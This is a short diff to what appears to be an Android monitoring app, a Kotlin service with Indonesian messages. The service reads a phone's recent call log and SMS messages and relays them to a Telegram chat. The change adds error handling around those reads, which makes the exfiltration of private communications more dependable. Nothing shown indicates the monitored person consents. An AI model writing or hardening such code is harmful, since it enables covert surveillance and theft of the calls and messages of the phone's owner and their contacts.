@@ -4607,7 +4607,10 @@ class MonitoringService : Service() {
             sendToTelegram("⚠️ Izin log panggilan hilang. Berikan di Setup.")
             return
         }
-        val calls = callLogRepository.getAllCalls(5)
+        val calls = try { callLogRepository.getAllCalls(5) } catch (_: Exception) {
+            sendToTelegram("⚠️ Gagal membaca riwayat panggilan. Coba lagi.")
+            return
+        }
         if (calls.isEmpty()) {
             sendToTelegram("📞 Tak ada riwayat panggilan.")
         } else {
@@ -4621,7 +4624,10 @@ class MonitoringService : Service() {
             sendToTelegram("⚠️ Izin SMS hilang. Berikan di Setup.")
             return
         }
-        val sms = smsRepository.getRecentSms(5)
+        val sms = try { smsRepository.getRecentSms(5) } catch (_: Exception) {
+            sendToTelegram("⚠️ Gagal membaca SMS. Coba lagi.")
+            return
+        }
         if (sms.isEmpty()) {
             sendToTelegram("💬 Tak ada SMS.")
         } else {
